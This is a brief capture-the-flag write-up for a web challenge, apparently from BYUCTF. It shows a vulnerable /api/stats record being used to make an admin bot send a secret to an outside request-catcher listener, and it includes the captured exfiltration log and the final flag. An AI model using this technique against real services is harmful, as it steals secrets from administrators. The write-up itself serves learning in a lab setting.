# Solve: 


Add a record use the vulnerbility in the /api/stats service to send the secret to a listener:

```
% python3.9 get_secret.py 
{"success": "Added", "id": "0e3a85f1-42f2-4084-ab8b-9bf99ec02c91"}
```

Make the admin visit the page:

```
Have the admin bot visit a page on this site
http://127.0.0.1:1337/api/stats/0e3a85f1-42f2-4084-ab8b-9bf99ec02c91
```
Get the secret from the respons:

```
request catcher
GET /test/log?data=948159a2b635668905b778606e5b1b0774820a4410d28782be1ad3f341eb4a76
2024-05-19T14:39:28+02:00
128.187.49.253
GET /test/log?data=948159a2b635668905b778606e5b1b0774820a4410d28782be1ad3f341eb4a76 HTTP/1.1
Host: myname.requestcatcher.com
Accept: */*
User-Agent: curl/7.88.1
```

Get the flag: 

```
python3.9 get_flag.py 

{"date": "Sun May 19 12:37:29 UTC 2024
byuctf{"not_a_problem"_YEAH_RIGHT}"}
```
